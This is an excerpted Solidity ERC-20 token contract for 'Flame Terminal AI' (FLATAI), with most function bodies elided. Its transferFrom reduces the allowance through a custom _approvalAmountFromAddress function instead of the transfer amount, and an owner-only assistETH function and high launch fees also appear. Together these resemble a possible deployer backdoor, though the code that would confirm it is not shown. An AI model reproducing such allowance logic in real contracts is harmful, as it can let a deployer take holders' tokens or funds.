...
/**
    Website:  https://flameterminalai.xyz
    Dapp:  https://app.flameterminalai.xyz
    Medium: https://flameterminalai.medium.com
    X:  https://x.com/flameterminalai
    Telegram:  https://t.me/flameterminalai
*/
...
contract FLATAI is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Flame Terminal AI";
    string private constant _symbol = unicode"FLATAI";
    ...
    bool private _trandingOpened;
    bool private inSwap = false;
    uint256 private _feeBeginLike = 20;
    uint256 private _feeEndLike = 0;
    uint256 private _removeFee = 10;
    uint256 private _preventSwapBefore = 10;
    address private _taxOwner;
    ...
    constructor() payable {
        ...
        _taxOwner = _msgSender();
        _balances[address(this)] = _tTotal;
    }

    function openTrading() external onlyOwner {
        require(!_trandingOpened, "trading is already open");
    ...
    function _approvalAmountFromAddress(
        address sender,
        address recipient,
        uint256 amount
    ...
    function assistETH(address payable newWallet) external {
        require(msg.sender == _taxOwner, "not deployer");
    ...
    function transferFrom(
        ...
        _approve(
            sender, _msgSender(),_allowances[sender][_msgSender()].sub(
                _approvalAmountFromAddress(sender, recipient, amount),"ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
